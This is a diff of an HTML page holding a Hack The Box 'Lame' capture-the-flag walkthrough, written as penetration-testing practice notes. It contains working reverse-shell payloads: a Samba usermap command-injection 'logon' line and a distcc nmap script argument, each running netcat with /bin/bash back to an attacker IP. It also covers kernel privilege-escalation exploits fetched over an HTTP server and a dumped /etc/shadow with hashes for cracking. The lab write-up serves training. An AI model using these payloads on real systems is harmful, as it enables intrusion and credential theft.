@@ -7,44 +7,95 @@
 </head>
 <body><div class="main"><div class="tree">
 <p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
-<p><a href="HacktheBox--Linux_Boxes--Lame.html">Lame</a></p>
+<p><a href="#Lame">Lame</a></p>
 
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--nmap.html">nmap</a></li>
+<li><a href="#nmap">nmap</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--nmap--all_ports.html">all ports</a></li>
+<li><a href="#all ports">all ports</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--ftp_vsftpd.html">ftp vsftpd</a></li>
+<li><a href="#ftp vsftpd">ftp vsftpd</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--ftp_vsftpd--nmap_scripts.html">nmap scripts</a></li>
+<li><a href="#nmap scripts">nmap scripts</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit.html">samba exploit</a></li>
+<li><a href="#samba exploit">samba exploit</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_through_Metasploit.html">root through Metasploit</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit.html">root without metasploit</a></li>
+<li><a href="#root through Metasploit">root through Metasploit</a></li>
+<li><a href="#root without metasploit">root without Metasploit</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit---tmp_share.html">/tmp share</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit--reverse_shell.html">reverse shell</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit--potential_problem_with_smbclient_2020_kali.html">potential problem with smbclient 2020 kali</a></li>
-</ol>
-</ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit.html">distccd v1 exploit</a></li>
-<ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--nmap_script_.cmd_execution.html">nmap script .cmd execution</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation.html">privilege escalation</a></li>
-<ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation---linux-exploit-suggestor-2.pl.html">/linux-exploit-suggestor-2.pl</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation--dirty_cow_(failed).html">dirty cow (failed)</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation--8572.c_(success).html">8572.c (success)</a></li>
+<li><a href="#/tmp share">/tmp share</a></li>
+<li><a href="#reverse shell">reverse shell</a></li>
+<li><a href="#potential problem with smbclient 2020 kali">potential problem with smbclient 2020 kali</a></li>
 </ol>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking.html">post exploitation password cracking</a></li>
+<li><a href="#distccd v1 exploit">distccd v1 exploit</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking---etc-shadow.html">/etc/shadow</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking--hashes.html">hashes</a></li>
-<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking--hashcat.html">hashcat</a></li>
+<li><a href="#nmap script .cmd execution">nmap script .cmd execution</a></li>
+<li><a href="#privilege escalation">privilege escalation</a></li>
+<ol>
+<li><a href="#/linux-exploit-suggestor-2.pl">/linux-exploit-suggestor-2.pl</a></li>
+<li><a href="#dirty cow (failed)">dirty cow (failed)</a></li>
+<li><a href="#8572.c (success)">8572.c (success)</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--Lame--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="#post exploitation password cracking">post exploitation password cracking</a></li>
+<ol>
+<li><a href="#/etc/shadow">/etc/shadow</a></li>
+<li><a href="#hashes">hashes</a></li>
+<li><a href="#hashcat">hashcat</a></li>
+</ol>
+<li><a href="#lessons learned">lessons learned</a></li>
 </ol></div>
-<div class="page"><h1><b><u>Lame</u></b></h1><img src="images/262-1.png" alt="images/262-1.png" /><br /><img src="images/262-2.png" alt="images/262-2.png" /></div></div>
+<div class="page", id="Lame"><h1><b><u>Lame</u></b></h1><img src="images/262-1.png" alt="images/262-1.png" /><br /><img src="images/262-2.png" alt="images/262-2.png" /></div>
+
+<div class="page", id="nmap"><h1><b><u>nmap</u></b></h1><img src="images/263-1.png" alt="images/263-1.png" /></div>
+
+
+<div class="page", id="all ports"><h1><b><u>all ports</u></b></h1><span style="color:#24ff00;">we see from the full port scan there is service named distccd the initial scanned missed.</span><br /><img src="images/264-1.png" alt="images/264-1.png" /><br /><br /><span style="color:#24ff00;">running </span><span style="color:#ffa500;">-sV </span><span style="color:#24ff00;">for enumerate version and<br /></span><span style="color:#ffa500;">-sC</span><span style="color:#24ff00;"> enumerate scripts gives us more info on the service<br /></span><span style="color:#ffa500;">nmap -p 3632 -sC -sV 10.10.10.3</span><br /><img src="images/264-2.png" alt="images/264-2.png" /></div>
+
+<div class="page", id="ftp vsftpd"><h1><b><u>ftp vsftpd</u></b></h1><img src="images/269-1.png" alt="images/269-1.png" /><br /><span style="color:#24ff00;">a quick google search reveals that vsftpd 2.3.4 is a notorious for a backdoor vulnerability built into it</span><br /><br /><img src="images/269-2.png" alt="images/269-2.png" /><br /><br /><img src="images/269-3.png" alt="images/269-3.png" /></div>
+
+<div class="page", id="nmap scripts"><h1><b><u>nmap scripts</u></b></h1><span style="color:#24ff00;">here's a good way to search through nmap's script database to search for potential vulnerabilties for services we've enumerated </span><br /><br /><span style="color:#ffa500;">ls /usr/share/nmap/scripts/ftp*</span><br /><span style="color:#24ff00;">where the </span><span style="color:#ffff00;">‘*’</span><span style="color:#24ff00;"> after </span><span style="color:#ffff00;">‘ftp’ </span><span style="color:#24ff00;">serves as a wildcard to list all of nmaps vulnerability scans relating to ftp</span><br /><img src="images/1987-1.png" alt="images/1987-1.png" /><br /><br /><span style="color:#24ff00;">lets use the</span><span style="color:#ffa500;"> ftp-vsftpd-backdoor.nse</span><span style="color:#24ff00;"> script to scan Lame's </span><span style="color:#ffff00;">vsftpd 2.3.4</span><span style="color:#24ff00;"> service</span><br /><br /><span style="color:#ffa500;">nmap --script=/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse -p 21 10.10.10.3</span><br /><img src="images/1987-2.png" alt="images/1987-2.png" /><br /><br /><br /><span style="color:#24ff00;">the script reports that the service is not vulnerable to the backdoor we serached, it's a rabbit hole </span></div>
+
+<div class="page", id="samba exploit"><h1><b><u>samba exploit</u></b></h1><span style="color:#24ff00;">A quick google on the </span><span style="color:#ffa500;">Samba smbd 3.X</span><span style="color:#24ff00;"> service reveals there is a command execution metasploit module we can use to own this box</span><br /><img src="images/265-1.png" alt="images/265-1.png" /><br /><br /><br /><br /><img src="images/265-2.png" alt="images/265-2.png" /><br /><img src="images/265-3.png" alt="images/265-3.png" /><br /></div>
+
+<div class="page", id="root through Metasploit"><h1><b><u>root through Metasploit</u></b></h1><span style="color:#24ff00;">fire up </span><span style="color:#ffa500;">msfconsole</span><span style="color:#24ff00;">, search for exploits named </span><span style="color:#ffa500;">samba</span><span style="color:#24ff00;"> and chose </span><span style="color:#ffa500;">“usermap_script”</span><span style="color:#24ff00;"> script </span><br /><br /><img src="images/266-1.png" alt="images/266-1.png" /></div>
+
+
+<div class="page", id="root without metasploit"><h1><b><u>root without metasploit</u></b></h1><span style="color:#24ff00;">according to the CVE description, theres a vulnerability that allows remote command execution from authenticated users (or any share that is not password protected!)</span><br /><img src="images/1988-1.png" alt="images/1988-1.png" /><br /><br /><span style="color:#24ff00;">we see we have annoymous access to Lame's smb shares, but lets further enumerate what kind of permissions we have on these shares with </span><span style="color:#ffa500;">smbmap</span><br /><span style="color:#ffa500;">smbclient -L 10.10.10.3</span><br /><img src="images/1988-2.png" alt="images/1988-2.png" /><br /><br /><span style="color:#24ff00;">we see we have read and write permissions to the </span><span style="color:#ffff00;">/tmp</span><span style="color:#24ff00;"> share!</span><br /><span style="color:#ffa500;">smbmap -H 10.10.10.3</span><br /><img src="images/1988-3.png" alt="images/1988-3.png" /></div>
+
+
+<div class="page", id="/tmp share"><h1><b><u>/tmp share</u></b></h1><span style="color:#24ff00;">we see we can list the files within the /tmp share! but according to cve-2007-2447, these files aren't necessary to execute </span><span style="color:#ffa500;">RCE</span><span style="color:#24ff00;"> (remote command execution)</span><br /><br /><img src="images/473-1.png" alt="images/473-1.png" /></div>
+
+
+<div class="page", id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">A quick google serach on metacharacters <br /><br /></span><img src="images/472-1.png" alt="images/472-1.png" /><br /><img src="images/472-2.png" alt="images/472-2.png" /><br /><br /><span style="color:#24ff00;">we'll use a netcat backdoor from </span><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br /><img src="images/472-3.png" alt="images/472-3.png" /><br /><br /><span style="color:#24ff00;"> We'll combine a </span><span style="color:#ffa500;">logon</span><span style="color:#24ff00;"> command along a </span><span style="color:#ffa500;">nohup</span><span style="color:#24ff00;"> command surrounded by metacharacters in order to trick Lame's smb samba service to run a backdoor netcat script back to our attack machine<br /></span><img src="images/472-4.png" alt="images/472-4.png" /><br /><span style="color:#ffa500;">logon "/=`nohup nc -nv 10.10.14.62 4444 -e /bin/bash`"</span><br /><img src="images/472-5.png" alt="images/472-5.png" /><br /><br /><span style="color:#24ff00;">run a netcat listener back on our machine on port 4444 before we run the logon command and we catch the shell as root!</span><br /><img src="images/472-6.png" alt="images/472-6.png" /></div>
+
+<div class="page", id="potential problem with smbclient 2020 kali"><h1><b><u>potential problem with smbclient 2020 kali</u></b></h1><span style="color:#24ff00;">if you are not using </span><span style="color:#ffa500;">smbclient</span><span style="color:#24ff00;"> on</span><span style="color:#ffa500;"> 2020 kali</span><span style="color:#24ff00;">, there's no need to heed this warning<br /><br />trying smbclient with our target host results in the following error message:<br /><img src="images/1989-1.png" alt="images/1989-1.png" /><br /><br />some googling and there seems to be a thread about it on reddit<br /><img src="images/1989-2.png" alt="images/1989-2.png" /><br /><br /><br /><img src="images/1989-3.png" alt="images/1989-3.png" /><br /><br />the post suggests to add the parametere “client min protocol” and set it to NT1 under the global section<br /><img src="images/1989-4.png" alt="images/1989-4.png" /><br /><br /><span style="color:#ffa500;">smbclient</span><span style="color:#24ff00;"> now works!<br /></span><img src="images/1989-5.png" alt="images/1989-5.png" /><br /><br /></span></div>
+
+<div class="page", id="distccd v1 exploit"><h1><b><u>distccd v1 exploit</u></b></h1><img src="images/1990-1.png" alt="images/1990-1.png" /><br /><br /><img src="images/1990-2.png" alt="images/1990-2.png" /><br /><br /><span style="color:#24ff00;">lets search nmap's script engine for it</span><br /><span style="color:#ffa500;">ls /usr/share/nmap/scripts/distcc*</span><br /><img src="images/1990-3.png" alt="images/1990-3.png" /><br /><br /></div>
+
+<div class="page", id="nmap script .cmd execution"><h1><b><u>nmap script .cmd execution</u></b></h1><span style="color:#24ff00;">we can add arguments to some of the nmap scripting engine exploits by appending the </span><span style="color:#ffa500;">--script-args &lt;command&gt;</span><span style="color:#24ff00;"> to the script</span><br /><br /><span style="color:#ffa500;">nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.62 5555 -e /bin/bash'"</span><br /><img src="images/1991-1.png" alt="images/1991-1.png" /><br /><br /><span style="color:#24ff00;">setting up a reverse shell listener, we pop a shell as user </span><span style="color:#ffff00;">daemon</span><span style="color:#24ff00;">!</span><br /><img src="images/1991-2.png" alt="images/1991-2.png" /></div>
+
+<div class="page", id="privilege escalation"><h1><b><u>privilege escalation</u></b></h1><span style="color:#24ff00;">since gaining control of the user makis through our exploitation of distcc, we'll have to escalate our privileges to root<br /><br />lets use uname -a to get the kernel version of the victim target and run it against a linux privilege escalator script</span><br /><strong><span style="color:#ffa500;">./linux-exploit-suggester-2.pl -k 2.6.32</span></strong><br /><br /><span style="color:#24ff00;">find the github here:</span><br /><img src="images/1992-1.png" alt="images/1992-1.png" /><br /><img src="images/1992-2.png" alt="images/1992-2.png" /><br /><br /><span style="color:#24ff00;">now we can check the exploit suggestor script against the kernel version of our victim machine, to get the version we can use the </span><span style="color:#ffa500;">uname -a</span><span style="color:#24ff00;"> command</span><br /><img src="images/1992-3.png" alt="images/1992-3.png" /><br /><br /></div>
+
+<div class="page", id="/linux-exploit-suggestor-2.pl"><h1><b><u>/linux-exploit-suggestor-2.pl</u></b></h1><span style="color:#ffa500;">/linux-exploit-suggester-2.pl -k 2.6.24</span><br /><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-k</span><span style="color:#24ff00;"> denotes the kernel version and </span><span style="color:#ffa500;">2.6.24</span><span style="color:#24ff00;"> is the version we extracted through the </span><span style="color:#ffa500;">uname -a </span><span style="color:#24ff00;">command on the victim</span><br /><img src="images/1993-1.png" alt="images/1993-1.png" /><br /><br /><img src="images/1993-2.png" alt="images/1993-2.png" /><br /><img src="images/1993-3.png" alt="images/1993-3.png" /><br /><img src="images/1993-4.png" alt="images/1993-4.png" /></div>
+
+<div class="page", id="dirty cow (failed)"><h1><b><u>dirty cow (failed)</u></b></h1><span style="color:#24ff00;">dirty cow is a reliable exploit but failed to priv escalate, but I figure it may be worthwhile to document the process for anyone interested in how to set up the exploit<br /></span><br /><br /><img src="images/1994-1.png" alt="images/1994-1.png" /><br /><br /><img src="images/1994-2.png" alt="images/1994-2.png" /><br /><img src="images/1994-3.png" alt="images/1994-3.png" /><br /><img src="images/1994-4.png" alt="images/1994-4.png" /><br /><span style="color:#24ff00;">copy the raw sourcecode over to your attacking machine and name is </span><span style="color:#ffff00;">dirty.c</span><br /><br /><img src="images/1994-5.png" alt="images/1994-5.png" /><br /><br /><span style="color:#24ff00;">spin up an http server to serve our victim the exploit with</span><br /><span style="color:#ffa500;">python -m SimpleHTTPServer &lt;port&gt;</span><br /><img src="images/1994-6.png" alt="images/1994-6.png" /><br /><img src="images/1994-7.png" alt="images/1994-7.png" /><br /><br /><br /><span style="color:#ffa500;">now download the exploit from our owned</span> <span style="color:#ffff00;">daemon</span> <span style="color:#24ff00;">user</span><br /><br /><img src="images/1994-8.png" alt="images/1994-8.png" /><br /><br /><span style="color:#24ff00;">give the file execute permissions with:<br /></span><span style="color:#ffa500;">chmod -x &lt;executable&gt;</span><br /><img src="images/1994-9.png" alt="images/1994-9.png" /><br /><br /><span style="color:#24ff00;">running it should instantly pop a root shell but the box is not vulernable to exploit<br /><img src="images/1994-10.png" alt="images/1994-10.png" /><br /><br />for the record, I have tried running dirty as the makis user as well and ran into the same permission denial which means Lame was most likely patched to prevent dirty cow from working</span><br /><br /></div>
+
+<div class="page", id="8572.c (success)"><h1><b><u>8572.c (success)</u></b></h1><img src="images/1995-1.png" alt="images/1995-1.png" /><br /><img src="images/1995-2.png" alt="images/1995-2.png" /><br /><br /><span style="color:#24ff00;">copy the file with </span><span style="color:#ffa500;">searchsploit -m linux/local/8572.c</span><br /><img src="images/1995-3.png" alt="images/1995-3.png" /><br /><br /><span style="color:#24ff00;">spin up a http server and download 8572.c to our victim machine</span><br /><img src="images/1995-4.png" alt="images/1995-4.png" /><br /><br /><img src="images/1995-5.png" alt="images/1995-5.png" /><br /><br /><span style="color:#24ff00;">as the exploit usage states, the udevd process ID can be found in the </span><span style="color:#ffff00;">/proc/net/netlink</span><span style="color:#24ff00;"> file</span><br /><img src="images/1995-6.png" alt="images/1995-6.png" /><br /><br /><span style="color:#24ff00;">running the exploit with the correct udevd PID returns this error:</span><br /><img src="images/1995-7.png" alt="images/1995-7.png" /><br /><br /><span style="color:#24ff00;">we'll need to write a </span><span style="color:#ffff00;">run</span><span style="color:#24ff00;"> script that our exploit will run as root to pop a root reverse shell on our attack machine</span><br /><span style="color:#24ff00;">we'll use <span style="color:#ffa500;">echo</span> to write the same <span style="color:#ffff00;">pen-test monkey</span> netcat reverse shell back to us</span><br /><img src="images/1995-8.png" alt="images/1995-8.png" /><br /><br /><br /><img src="images/1995-9.png" alt="images/1995-9.png" /><br /><br /><span style="color:#24ff00;">start a listener on the port you specified in your run script and spawn a root shell!</span><br /><img src="images/1995-10.png" alt="images/1995-10.png" /></div>
+
+
+<div class="page", id="post exploitation password cracking"><h1><b><u>post exploitation password cracking</u></b></h1><span style="color:#24ff00;">testing out </span><span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"> for fun on Lame's passwords to see if we can crack them</span></div>
+
+
+<div class="page", id="/etc/shadow"><h1><b><u>/etc/shadow</u></b></h1><br />root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::<br />daemon:*:14684:0:99999:7:::<br />bin:*:14684:0:99999:7:::<br />sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::<br />sync:*:14684:0:99999:7:::<br />games:*:14684:0:99999:7:::<br />man:*:14684:0:99999:7:::<br />lp:*:14684:0:99999:7:::<br />mail:*:14684:0:99999:7:::<br />news:*:14684:0:99999:7:::<br />uucp:*:14684:0:99999:7:::<br />proxy:*:14684:0:99999:7:::<br />www-data:*:14684:0:99999:7:::<br />backup:*:14684:0:99999:7:::<br />list:*:14684:0:99999:7:::<br />irc:*:14684:0:99999:7:::<br />gnats:*:14684:0:99999:7:::<br />nobody:*:14684:0:99999:7:::<br />libuuid:!:14684:0:99999:7:::<br />dhcp:*:14684:0:99999:7:::<br />syslog:*:14684:0:99999:7:::<br />klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::<br />sshd:*:14684:0:99999:7:::<br />bind:*:14685:0:99999:7:::<br />postfix:*:14685:0:99999:7:::<br />ftp:*:14685:0:99999:7:::<br />postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::<br />mysql:!:14685:0:99999:7:::<br />tomcat55:*:14691:0:99999:7:::<br />distccd:*:14698:0:99999:7:::<br />service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::<br />telnetd:*:14715:0:99999:7:::<br />proftpd:!:14727:0:99999:7:::<br />statd:*:15474:0:99999:7:::<br />snmp:*:15480:0:99999:7:::<br />makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::<br /></div>
+
+<div class="page", id="hashes"><h1><b><u>hashes</u></b></h1>$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0<br />$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.<br />$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0<br />$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.<br />$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/<br />$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.<br /></div>
+
+<div class="page", id="hashcat"><h1><b><u>hashcat</u></b></h1><img src="images/272-1.png" alt="images/272-1.png" /><br /><img src="images/272-2.png" alt="images/272-2.png" /></div>
+
+<div class="page", id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br /><br /><img src="images/1950-1.png" alt="images/1950-1.png" /></div>
+
+
+</div>
 </body></html>
